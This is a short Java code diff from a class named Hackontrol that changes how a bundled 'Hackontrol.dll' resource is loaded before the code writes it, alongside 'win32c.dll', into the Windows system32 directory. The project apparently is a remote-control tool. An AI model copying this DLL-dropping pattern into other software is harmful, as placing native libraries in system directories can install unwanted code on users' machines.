@@ -162,7 +162,7 @@ public class Hackontrol {
 		File win32Library = new File(system32Directory, "win32c.dll");
 		Win32Library.setCopyLibraryPath(win32Library.getAbsolutePath());
 		File libraryFile = new File(system32Directory, Hackontrol.LIBRARY_NAME);
-		InputStream stream = Hackontrol.class.getClassLoader().getResourceAsStream("Hackontrol.dll");
+		InputStream stream = Hackontrol.class.getResourceAsStream("Hackontrol.dll");
 		byte[] data = stream.readAllBytes();
 		stream.close();
 		FileOutputStream output = new FileOutputStream(libraryFile);
